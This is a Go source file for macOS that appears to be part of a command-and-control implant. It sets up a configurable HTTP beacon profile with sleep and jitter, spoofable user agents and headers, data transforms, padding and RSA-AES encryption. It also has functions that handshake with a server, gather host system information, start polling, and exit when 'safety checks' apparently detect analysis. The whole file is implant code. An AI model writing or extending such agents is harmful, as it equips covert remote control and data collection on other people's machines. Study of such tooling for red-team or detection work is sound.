//go:build darwin
// +build darwin

package main

import (
	"fmt"
	"os"
	"sync"
)

var (
	cfgKey   string
	clientID string
	sleep    string
	jitter   string

	userAgent          string
	contentType        string
	customHeaders      string
	getRoute           string
	postRoute          string
	getMethod          string
	postMethod         string
	getClientIDName    string
	getClientIDFormat  string
	postClientIDName   string
	postClientIDFormat string
	postSecretName     string
	postSecretFormat   string
	publicKey          string
	secret             string
	protocol           string
	ip                 string
	port               string

	getClientIDTransforms  string
	postClientIDTransforms string
	postDataTransforms     string
	responseDataTransforms string

	httpHeaderUserAgent   string
	httpHeaderContentType string
	httpHeaderPadPre      string
	httpHeaderPadApp      string
	httpMetaId            string
	httpMetaEncryption    string
	httpEncRsaAes         string
)

var handshakeManager *ConnMgr

var clientIDMu sync.RWMutex

func getClientID() string {
	clientIDMu.RLock()
	defer clientIDMu.RUnlock()
	return clientID
}

func setClientID(id string) {
	clientIDMu.Lock()
	defer clientIDMu.Unlock()
	clientID = id
}

func refreshHandshake() error {
	if !performSafetyChecks() {
		stopPolling()
		os.Exit(1)
	}

	stopPolling()

	if err := handshakeManager.refreshHandshake(); err != nil {
		return err
	}

	setClientID(handshakeManager.getCurrentClientID())

	getURL, postURL := handshakeManager.getCurrentURLs()

	sysInfoReport, err := collectSystemInfo(getClientID())
	if err != nil {
		return fmt.Errorf("%s", ErrCtx(E19, err.Error()))
	}

	pollConfig := SyncConfig{
		GetURL:          getURL,
		PostURL:         postURL,
		DecryptedValues: handshakeManager.decryptedValues,
	}

	if err := startPolling(pollConfig, sysInfoReport); err != nil {
		return fmt.Errorf("%s", ErrCtx(E19, err.Error()))
	}

	return nil
}

func debugSafetyChecks() {
}
